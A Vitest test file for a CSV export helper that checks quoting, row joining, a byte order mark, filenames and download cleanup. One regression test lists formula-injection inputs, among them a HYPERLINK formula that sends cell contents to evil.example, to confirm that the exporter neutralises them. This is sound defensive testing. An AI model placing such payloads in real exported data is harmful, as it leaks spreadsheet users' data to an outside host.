import { describe, expect, it, vi } from "vitest";
import {
  buildCsv,
  downloadCsv,
  escapeCsvValue,
  toCsv,
} from "@/lib/csv";

describe("escapeCsvValue", () => {
  it("quotes and escapes embedded quotes", () => {
    expect(escapeCsvValue('say "hi"')).toBe('"say ""hi"""');
  });

  it("renders null and undefined as an empty quoted cell", () => {
    expect(escapeCsvValue(null)).toBe('""');
    expect(escapeCsvValue(undefined)).toBe('""');
  });

  it("leaves ordinary text untouched apart from quoting", () => {
    expect(escapeCsvValue("openai")).toBe('"openai"');
    expect(escapeCsvValue(42)).toBe('"42"');
  });

  // Regression test. Quoting alone does not stop a spreadsheet from evaluating
  // a cell that begins with one of these characters, and a nickname or a note is
  // user controlled and exported verbatim.
  it.each([
    ["=HYPERLINK(\"https://evil.example/leak?\"&A1,\"x\")", "formula"],
    ["+1+1", "formula"],
    ["-2+3", "formula"],
    ["@SUM(A1)", "formula"],
  ])("neutralises a leading %s (%s)", (value) => {
    const escaped = escapeCsvValue(value);
    expect(escaped.startsWith('"=')).toBe(false);
    expect(escaped.startsWith('"+')).toBe(false);
    expect(escaped.startsWith('"-')).toBe(false);
    expect(escaped.startsWith('"@')).toBe(false);
    // The original text is still recoverable, prefixed by the literal marker and
    // with any embedded quotes doubled as CSV requires.
    expect(escaped).toBe(`"'${String(value).replace(/"/g, '""')}"`);
  });

  it("neutralises a leading tab or carriage return", () => {
    expect(escapeCsvValue("\t=1+1")).toBe(`"'\t=1+1"`);
    expect(escapeCsvValue("\r=1+1")).toBe(`"'\r=1+1"`);
  });

  it("does not alter a formula character that is not leading", () => {
    // Only a leading character is dangerous, so an equals sign in the middle of
    // a sentence must survive unchanged.
    expect(escapeCsvValue("a=b")).toBe('"a=b"');
  });
});

describe("toCsv", () => {
  it("joins rows with CRLF and escapes every cell", () => {
    const csv = toCsv([
      ["a", "b"],
      ["=1", 'q"q'],
    ]);
    expect(csv).toBe('"a","b"\r\n"\'=1","q""q"');
  });

  it("returns an empty string for no rows", () => {
    expect(toCsv([])).toBe("");
  });
});

describe("buildCsv", () => {
  it("prefixes a UTF-8 byte order mark so spreadsheets detect the encoding", () => {
    const { content } = buildCsv("export", [["nickname"]]);
    expect(content.startsWith("\uFEFF")).toBe(true);
  });

  it("includes the base name and the current date in the filename", () => {
    const { filename } = buildCsv("keyping-history", [["a"]]);
    const today = new Date().toISOString().slice(0, 10);
    expect(filename).toBe(`keyping-history-${today}.csv`);
  });
});

describe("downloadCsv", () => {
  it("returns the filename it produced and releases the object URL", () => {
    // jsdom implements neither the object URL API nor link navigation, so both
    // are stubbed. Without the click stub, jsdom logs a "not implemented"
    // navigation error for every download.
    const createObjectURL = vi.fn(() => "blob:keyping");
    const revokeObjectURL = vi.fn();
    const click = vi.spyOn(HTMLAnchorElement.prototype, "click").mockImplementation(() => {});
    vi.stubGlobal("URL", Object.assign(URL, { createObjectURL, revokeObjectURL }));

    const today = new Date().toISOString().slice(0, 10);
    expect(downloadCsv("keyping-export", [["a"]])).toBe(`keyping-export-${today}.csv`);
    expect(createObjectURL).toHaveBeenCalledOnce();
    expect(click).toHaveBeenCalledOnce();
    // The object URL must be released or the blob is retained for the page
    // lifetime.
    expect(revokeObjectURL).toHaveBeenCalledWith("blob:keyping");

    click.mockRestore();
    vi.unstubAllGlobals();
  });
});
